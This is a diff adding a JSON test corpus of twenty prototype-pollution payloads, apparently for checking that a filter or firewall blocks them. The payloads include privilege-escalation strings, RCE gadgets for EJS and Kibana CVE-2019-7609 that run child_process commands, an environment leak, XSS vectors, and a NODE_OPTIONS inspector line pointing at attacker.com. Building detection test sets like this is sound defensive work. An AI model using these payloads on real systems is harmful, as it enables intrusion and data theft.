@@ -1,0 +1,182 @@
+[
+    {
+      "id": "proto-001",
+      "payload": "{\"__proto__\": {\"isAdmin\": true}}",
+      "tags": ["prototype-pollution", "json", "privilege-escalation"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Basic prototype pollution - add isAdmin property",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-002",
+      "payload": "{\"__proto__\": {\"admin\": true}}",
+      "tags": ["prototype-pollution", "json", "privilege-escalation"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Prototype pollution - add admin property",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-003",
+      "payload": "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
+      "tags": ["prototype-pollution", "json", "constructor"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Prototype pollution via constructor.prototype",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-004",
+      "payload": "?__proto__[isAdmin]=true",
+      "tags": ["prototype-pollution", "querystring"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "URL query string prototype pollution",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-005",
+      "payload": "?a[__proto__][isAdmin]=true",
+      "tags": ["prototype-pollution", "querystring", "nested"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Nested query string prototype pollution",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-006",
+      "payload": "?a[constructor][prototype][isAdmin]=true",
+      "tags": ["prototype-pollution", "querystring", "constructor"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Constructor-based query string pollution",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-007",
+      "payload": "{\"__proto__\": {\"evilProperty\": \"evilPayload\"}}",
+      "tags": ["prototype-pollution", "json"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "Generic prototype pollution payload",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-008",
+      "payload": "{\"__proto__\": {\"shell\": \"node\", \"NODE_OPTIONS\": \"--inspect=attacker.com\"}}",
+      "tags": ["prototype-pollution", "nodejs", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "NodeJS prototype pollution RCE via NODE_OPTIONS",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-009",
+      "payload": "{\"__proto__\": {\"argv0\": \"node\", \"shell\": \"node\", \"NODE_OPTIONS\": \"--inspect=payload\"}}",
+      "tags": ["prototype-pollution", "nodejs", "rce", "async"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "NodeJS async hook prototype pollution RCE",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-010",
+      "payload": "{\"__proto__\": {\"outputFunctionName\": \"x;process.mainModule.require('child_process').execSync('id');s\"}}",
+      "tags": ["prototype-pollution", "ejs", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "EJS gadget prototype pollution RCE",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-011",
+      "payload": "{\"__proto__\": {\"escapeFunction\": \"(() => {})//\"}}",
+      "tags": ["prototype-pollution", "ejs", "rce"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "EJS escapeFunction gadget",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-012",
+      "payload": "{\"__proto__\": {\"client\": true, \"escapeFunction\": \"1;return process.env\"}}",
+      "tags": ["prototype-pollution", "ejs", "info-disclosure"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "EJS prototype pollution environment leak",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-013",
+      "payload": ".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"id\")')",
+      "tags": ["prototype-pollution", "kibana", "cve-2019-7609"],
+      "expected_block": true,
+      "severity_hint": "critical",
+      "notes": "Kibana CVE-2019-7609 prototype pollution RCE",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-014",
+      "payload": "{\"__proto__\": {\"parameterLimit\": 1}}",
+      "tags": ["prototype-pollution", "express", "dos"],
+      "expected_block": true,
+      "severity_hint": "medium",
+      "notes": "ExpressJS prototype pollution detection",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-015",
+      "payload": "{\"__proto__\": {\"status\": 510}}",
+      "tags": ["prototype-pollution", "express", "detection"],
+      "expected_block": true,
+      "severity_hint": "medium",
+      "notes": "ExpressJS response status pollution",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-016",
+      "payload": "__proto__[polluted]=true",
+      "tags": ["prototype-pollution", "form-data"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "Form data prototype pollution",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-017",
+      "payload": "constructor.prototype.polluted=true",
+      "tags": ["prototype-pollution", "form-data", "constructor"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "Form data constructor pollution",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-018",
+      "payload": "{\"__proto__\": {\"allowedHosts\": \"all\"}}",
+      "tags": ["prototype-pollution", "webpack", "bypass"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "Webpack dev server prototype pollution",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-019",
+      "payload": "?__proto__.onerror=alert(1)",
+      "tags": ["prototype-pollution", "xss", "dom"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "Client-side prototype pollution to XSS",
+      "category": "Deserialization"
+    },
+    {
+      "id": "proto-020",
+      "payload": "?__proto__[innerHTML]=<img/src/onerror=alert(1)>",
+      "tags": ["prototype-pollution", "xss", "dom"],
+      "expected_block": true,
+      "severity_hint": "high",
+      "notes": "Prototype pollution innerHTML XSS gadget",
+      "category": "Deserialization"
+    }
+]
